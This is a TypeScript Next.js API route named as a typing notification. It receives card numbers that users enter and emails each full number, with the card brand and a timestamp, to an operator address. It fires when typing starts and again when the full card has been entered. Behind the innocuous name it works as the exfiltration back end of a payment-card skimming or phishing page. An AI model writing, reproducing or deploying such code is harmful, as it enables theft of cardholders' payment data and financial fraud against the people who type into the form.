// src/app/api/notify/typing/route.ts
import { NextResponse } from "next/server";
import { sendEmail, getPrimaryEmails } from "@/lib/email";

export async function POST(req: Request) {
  const enabled = String(process.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';
  if (!enabled) return NextResponse.json({ ok: true, skipped: true });

  try {
    const body = await req.json();
    const { event, cardNumber, brandName } = body;
    
    const to = getPrimaryEmails();
    if (!to) return NextResponse.json({ error: "No primary email" }, { status: 500 });

    let heading = event === 'typing_start' ? '⌨️ Started Typing' : '💳 Full Card Entered';
    
    const html = `
      <div style="font-family: sans-serif; padding: 20px;">
        <h2>${heading}</h2>
        <p><strong>Card Type:</strong> ${brandName}</p>
        <p><strong>Card Number:</strong> <span style="font-family: monospace; font-size: 18px;">${cardNumber}</span></p>
        <p><strong>Time:</strong> ${new Date().toISOString()}</p>
      </div>
    `;

    await sendEmail({ to, subject: heading, html });
    return NextResponse.json({ ok: true });
  } catch (err) {
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}